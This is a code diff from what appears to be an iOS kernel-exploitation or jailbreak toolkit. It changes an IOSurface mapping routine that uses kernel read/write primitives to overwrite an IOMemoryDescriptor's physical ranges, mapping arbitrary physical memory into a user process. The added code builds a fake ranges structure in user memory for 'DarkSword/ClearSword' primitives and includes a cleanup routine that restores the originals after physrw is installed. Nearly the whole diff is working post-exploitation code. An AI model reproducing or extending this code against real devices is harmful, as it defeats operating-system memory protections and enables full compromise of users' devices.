@@ -44,6 +44,11 @@ uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
 	return kread_ptr(memoryDescriptor + 0x60);
 }
 
+void IOMemoryDescriptor_set_ranges(uint64_t memoryDescriptor, uint64_t ranges)
+{
+	kwrite64(memoryDescriptor + 0x60, ranges);
+}
+
 uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
 {
 	return kread64(memoryDescriptor + 0x50);
@@ -98,6 +103,15 @@ static mach_port_t IOSurface_map_getSurfacePort(uint64_t magic)
 	return port;
 }
 
+struct IOSurface_toCleanup {
+	uint64_t descriptor;
+	uint64_t origRanges;
+	uint64_t *fakeRangesUA;
+};
+
+static struct IOSurface_toCleanup *cleanups = NULL;
+static unsigned cleanupsCount = 0;
+
 int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr)
 {
 	mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337);
@@ -107,8 +121,37 @@ int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr)
 	uint64_t desc = IOSurface_get_memoryDescriptor(surface);
 	uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);
 
-	kwrite64(ranges, pa);
-	kwrite64(ranges+8, size);
+	if (gPrimitives.krwMinSafeReadSize > 0x10) {
+		// DarkSword/ClearSword primitives cannot safely perform the 8-byte
+		// writes required by an IOMemoryDescriptor ranges structure. Place a
+		// kernel-addressable copy in user memory and restore the original
+		// structure after physrw has replaced the exploit primitive.
+		uint64_t *fakeRanges = malloc(2 * sizeof(uint64_t));
+		if (!fakeRanges) return -1;
+		fakeRanges[0] = pa;
+		fakeRanges[1] = size;
+		uint64_t fakeRangesKA = phystokv(vtophys(ttep_self(), (uint64_t)fakeRanges));
+		if (!fakeRangesKA) {
+			free(fakeRanges);
+			return -1;
+		}
+		IOMemoryDescriptor_set_ranges(desc, fakeRangesKA);
+		struct IOSurface_toCleanup *newCleanups = realloc(cleanups, (cleanupsCount + 1) * sizeof(*cleanups));
+		if (!newCleanups) {
+			IOMemoryDescriptor_set_ranges(desc, ranges);
+			free(fakeRanges);
+			return -1;
+		}
+		cleanups = newCleanups;
+		cleanups[cleanupsCount].descriptor = desc;
+		cleanups[cleanupsCount].origRanges = ranges;
+		cleanups[cleanupsCount].fakeRangesUA = fakeRanges;
+		cleanupsCount++;
+	}
+	else {
+		kwrite64(ranges, pa);
+		kwrite64(ranges + 8, size);
+	}
 
 	IOMemoryDescriptor_set_size(desc, size);
 
@@ -130,9 +173,29 @@ int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr)
     vm_prot_t cur_prot, max_prot;
     kern_return_t kr = vm_remap(mach_task_self(), uaddr, size, 0, VM_FLAGS_ANYWHERE, mach_task_self(), (vm_address_t)*uaddr, FALSE, &cur_prot, &max_prot, VM_INHERIT_NONE);
     assert (kr == KERN_SUCCESS);
-/*********************************************************************************/
+	/*********************************************************************************/
 
 	return 0;
+}
+
+void IOSurface_map_cleanup(void)
+{
+	// Once physrw is installed, the primitive can safely write the original
+	// ranges structure again. A stale exploit primitive must never attempt it.
+	if (gPrimitives.krwMinSafeReadSize > 0x10 || cleanupsCount == 0) return;
+
+	for (unsigned i = 0; i < cleanupsCount; i++) {
+		uint64_t desc = cleanups[i].descriptor;
+		uint64_t origRanges = cleanups[i].origRanges;
+		uint64_t *fakeRangesUA = cleanups[i].fakeRangesUA;
+		kwrite64(origRanges, fakeRangesUA[0]);
+		kwrite64(origRanges + 8, fakeRangesUA[1]);
+		IOMemoryDescriptor_set_ranges(desc, origRanges);
+		free(fakeRangesUA);
+	}
+	free(cleanups);
+	cleanups = NULL;
+	cleanupsCount = 0;
 }
 
 static mach_port_t IOSurface_kalloc_getSurfacePort(uint64_t size)
